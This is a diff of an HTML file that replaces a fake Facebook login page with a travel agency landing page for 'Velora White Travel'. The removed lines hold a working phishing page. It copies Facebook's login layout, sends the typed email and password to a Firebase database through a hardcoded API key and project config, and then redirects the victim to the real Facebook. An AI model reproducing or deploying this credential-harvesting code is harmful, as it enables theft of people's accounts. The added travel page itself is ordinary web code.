@@ -1,83 +1,21 @@
-<!DOCTYPE html>
+<!doctype html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Facebook - Log In or Sign Up</title>
-    <style>
-        body { font-family: Helvetica, Arial, sans-serif; background-color: #f0f2f5; margin: 0; display: flex; flex-direction: column; align-items: center; }
-        
-        /* Disclaimer Styles */
-        .disclaimer { background-color: white; color: red; padding: 20px; text-align: center; border: 5px solid red; margin-top: 20px; width: 80%; font-size: 24px; font-weight: bold; }
-
-        .container { display: flex; width: 980px; margin-top: 40px; justify-content: space-between; }
-        .fb-text { width: 500px; padding-top: 40px; }
-        .fb-text h1 { color: #1877f2; font-size: 60px; margin-bottom: 0; }
-        .fb-text p { font-size: 28px; line-height: 32px; width: 450px; }
-        
-        .login-box { background: white; padding: 20px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0, 0, 0, .1), 0 8px 16px rgba(0, 0, 0, .1); width: 396px; text-align: center; }
-        input { width: 90%; padding: 14px; margin-bottom: 12px; border: 1px solid #dddfe2; border-radius: 6px; font-size: 17px; }
-        .login-btn { width: 100%; background-color: #1877f2; border: none; border-radius: 6px; color: white; font-size: 20px; font-weight: bold; padding: 12px; cursor: pointer; }
-        .forgot { color: #1877f2; font-size: 14px; margin: 16px 0; text-decoration: none; display: block; }
-        hr { border: 0.5px solid #dadde1; margin-bottom: 20px; }
-        .create-btn { background-color: #42b72a; border: none; border-radius: 6px; color: white; font-size: 17px; font-weight: bold; padding: 12px 16px; cursor: pointer; }
-    </style>
+  <meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Velora White Travel</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+  <script>tailwind.config={theme:{extend:{fontFamily:{display:['Cormorant Garamond','serif'],sans:['DM Sans','sans-serif']},colors:{ink:'#123142',mist:'#F5F4EF',coral:'#E8775D',gold:'#C99A45'}}}};</script>
+  <link rel="preconnect" href="https://fonts.googleapis.com"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Cormorant+Garamond:wght@500;600;700&family=DM+Sans:wght@400;500;600;700&display=swap" rel="stylesheet"><link rel="stylesheet" href="styles.css">
 </head>
-<body>
-
-    
-
-    <div class="container">
-        <div class="fb-text">
-            <h1>facebook</h1>
-            <p>Facebook helps you connect and share with the people in your life.</p>
-        </div>
-        <div class="login-box">
-            <input type="text" id="email" placeholder="Email address or phone number">
-            <input type="password" id="password" placeholder="Password">
-            <button class="login-btn" onclick="saveData()">Log In</button>
-            <a href="#" class="forgot">Forgotten password?</a>
-            <hr>
-            <button class="create-btn">Create new account</button>
-        </div>
-    </div>
-
-    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
-    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
-
-    <script>
-        // Firebase configuration
-        const firebaseConfig = {
-            apiKey: "AIzaSyAF__nT0KcIICvwJuZUf05P2iMZfDiNo6M",
-            authDomain: "yasodha-ac86b.firebaseapp.com",
-            databaseURL: "https://yasodha-ac86b-default-rtdb.firebaseio.com",
-            projectId: "yasodha-ac86b",
-            storageBucket: "yasodha-ac86b.firebasestorage.app",
-            messagingSenderId: "268363750401",
-            appId: "1:268363750401:web:d97405614b6bf6089e3400",
-            measurementId: "G-3JWTJG76P6"
-        };
-
-        // Initialize Firebase
-        firebase.initializeApp(firebaseConfig);
-        const database = firebase.database();
-
-        function saveData() {
-            var email = document.getElementById('email').value;
-            var password = document.getElementById('password').value;
-
-            if(email && password) {
-                database.ref('logins/' + Date.now()).set({
-                    email: email,
-                    password: password
-                }).then(() => {
-                    
-                    window.location.href = "https://www.facebook.com"; // Redirect to real FB
-                });
-            } else {
-                alert("Please fill all fields");
-            }
-        }
-    </script>
-</body>
-</html>
+<body class="bg-mist text-ink antialiased">
+<header class="absolute top-0 left-0 right-0 z-20 px-5 py-5 md:px-10"><nav class="mx-auto flex max-w-7xl items-center justify-between rounded-full border border-white/30 bg-white/10 px-5 py-3 text-white backdrop-blur-md"><a href="#top" class="font-display text-2xl font-semibold">Velora <span class="font-sans text-xs uppercase tracking-[.35em]">White Travel</span></a><div class="hidden items-center gap-8 text-sm md:flex"><a href="#packages">Journeys</a><a href="#why">Why Velora</a><a href="#contact">Contact</a></div><a href="#packages" class="rounded-full bg-white px-4 py-2 text-sm font-semibold text-ink">Explore trips</a></nav></header>
+<main id="top">
+<section class="relative min-h-[680px] overflow-hidden bg-ink"><div id="hero-image" class="absolute inset-0 bg-cover bg-center transition-all duration-700" style="background-image:url('assets/mirissa.jpg')"></div><div class="absolute inset-0 bg-gradient-to-r from-ink/85 via-ink/35 to-transparent"></div><div class="relative mx-auto flex min-h-[680px] max-w-7xl items-end px-6 pb-20 pt-40 md:px-10"><div class="max-w-2xl text-white"><p class="mb-5 text-xs font-semibold uppercase tracking-[.35em] text-gold">Travel, with feeling</p><h1 class="font-display text-6xl leading-[.9] md:text-8xl">Go where the<br><em>beautiful</em> begins.</h1><p class="mt-7 max-w-lg text-base leading-7 text-white/80 md:text-lg">Curated escapes across Sri Lanka and beyond, designed around the way you want to feel when you return.</p><div class="mt-8 flex flex-wrap gap-3"><a href="#packages" class="rounded-full bg-coral px-6 py-3 text-sm font-bold text-white">Find your journey ↗</a><a href="#why" class="rounded-full border border-white/30 px-6 py-3 text-sm font-semibold text-white">Our approach</a></div></div></div></section>
+<section id="packages" class="mx-auto max-w-7xl px-6 py-20 md:px-10"><div class="mb-10 flex flex-col justify-between gap-5 md:flex-row md:items-end"><div><p class="text-xs font-bold uppercase tracking-[.3em] text-coral">The edit</p><h2 class="mt-3 font-display text-5xl leading-none md:text-6xl">Journeys worth<br><em>remembering.</em></h2></div><p class="max-w-sm text-sm leading-6 text-ink/60">Thoughtful stays, honest local moments and enough room for the unexpected.</p></div><div id="package-grid" class="grid gap-6 md:grid-cols-2 lg:grid-cols-3"></div></section>
+<section id="why" class="bg-ink px-6 py-20 text-white md:px-10"><div class="mx-auto grid max-w-7xl gap-12 md:grid-cols-[1.1fr_.9fr] md:items-center"><div><p class="text-xs font-bold uppercase tracking-[.3em] text-gold">The Velora way</p><h2 class="mt-4 max-w-xl font-display text-5xl leading-none md:text-7xl">A little more<br><em>you</em> in every trip.</h2><p class="mt-6 max-w-lg leading-7 text-white/65">We listen first, then shape the route around your pace, your people and the places you are curious about.</p></div><div class="grid grid-cols-2 gap-3"><div class="rounded-3xl border border-white/10 bg-white/5 p-6"><span class="text-3xl text-gold">01</span><h3 class="mt-16 font-display text-3xl">Local insight</h3></div><div class="rounded-3xl bg-coral p-6"><span class="text-3xl">02</span><h3 class="mt-16 font-display text-3xl">Easy planning</h3></div><div class="rounded-3xl bg-white p-6 text-ink"><span class="text-3xl text-coral">03</span><h3 class="mt-16 font-display text-3xl">Human support</h3></div><div class="rounded-3xl border border-white/10 bg-white/5 p-6"><span class="text-3xl text-gold">04</span><h3 class="mt-16 font-display text-3xl">Good memories</h3></div></div></div></section>
+<section id="contact" class="mx-auto max-w-7xl px-6 py-20 text-center md:px-10"><p class="text-xs font-bold uppercase tracking-[.3em] text-coral">Start somewhere beautiful</p><h2 class="mx-auto mt-4 max-w-2xl font-display text-5xl leading-none md:text-7xl">Your next story<br><em>starts here.</em></h2><a href="mailto:hello@velorawhite.com" class="mt-8 inline-flex rounded-full bg-ink px-7 py-3 text-sm font-bold text-white">Talk to our team ↗</a></section>
+</main>
+<div id="package-modal" class="fixed inset-0 z-40 hidden items-center justify-center bg-ink/70 p-4 backdrop-blur-sm"><div class="max-h-[90vh] w-full max-w-5xl overflow-y-auto rounded-[2rem] bg-mist shadow-2xl"><div class="flex justify-end p-4"><button id="close-modal" class="rounded-full bg-white px-4 py-2 text-xl">×</button></div><div class="grid gap-8 px-6 pb-8 md:grid-cols-[1.2fr_.8fr] md:px-10 md:pb-10"><div><div id="modal-gallery" class="grid grid-cols-2 gap-3"></div><h2 id="modal-title" class="mt-6 font-display text-5xl"></h2><p id="modal-description" class="mt-3 leading-7 text-ink/65"></p></div><form id="request-form" class="rounded-3xl bg-white p-6 shadow-sm"><p class="text-xs font-bold uppercase tracking-[.25em] text-coral">Request this journey</p><p id="modal-price" class="mt-3 font-display text-4xl"></p><input type="hidden" id="request-package"><label class="mt-6 block text-sm font-semibold">Your name<input required name="name" class="field" placeholder="Full name"></label><label class="mt-4 block text-sm font-semibold">Contact number or email<input required name="contact" class="field" placeholder="+94 77 123 4567"></label><label class="mt-4 block text-sm font-semibold">Message<textarea name="message" rows="3" class="field" placeholder="Tell us a little about your plans"></textarea></label><button class="mt-5 w-full rounded-full bg-coral px-5 py-3 font-bold text-white">Send request ↗</button><p id="form-status" class="mt-4 hidden rounded-2xl bg-green-50 p-3 text-sm text-green-800"></p></form></div></div></div>
+<script src="app.js"></script>
+</body></html>
